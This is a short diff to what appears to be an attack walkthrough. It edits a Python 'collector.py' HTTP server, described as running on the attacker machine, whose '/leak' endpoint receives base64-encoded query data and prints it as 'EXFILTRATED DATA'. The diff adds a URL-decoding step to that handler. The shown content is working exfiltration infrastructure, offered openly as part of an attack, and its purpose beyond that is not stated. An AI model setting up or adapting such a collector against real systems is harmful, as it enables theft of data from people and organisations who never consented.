@@ -153,7 +153,7 @@ Set up a collector script (`collector.py`) on the attacker machine. This script 
 
 ```python
 from http.server import BaseHTTPRequestHandler, HTTPServer
-from urllib.parse import urlparse, parse_qs, unquote_to_bytes
+from urllib.parse import urlparse, parse_qs, unquote_to_bytes, unquote
 import base64
 import os
 
@@ -164,11 +164,12 @@ class Handler(BaseHTTPRequestHandler):
         if u.path == "/leak":
             d = parse_qs(u.query).get("d", [""])[0]
             raw = unquote_to_bytes(d)
-            decoded = base64.b64decode(raw)
+            after_b64 = base64.b64decode(raw)
+            after_url = unquote(after_b64.decode("ascii", errors="replace"))
             print("\n" + "=" * 60)
             print("[+] EXFILTRATED DATA:")
             print("=" * 60)
-            print(decoded.decode("utf-8", errors="replace"))
+            print(after_url)
             print("=" * 60 + "\n")
             self.send_response(200)
             self.end_headers()
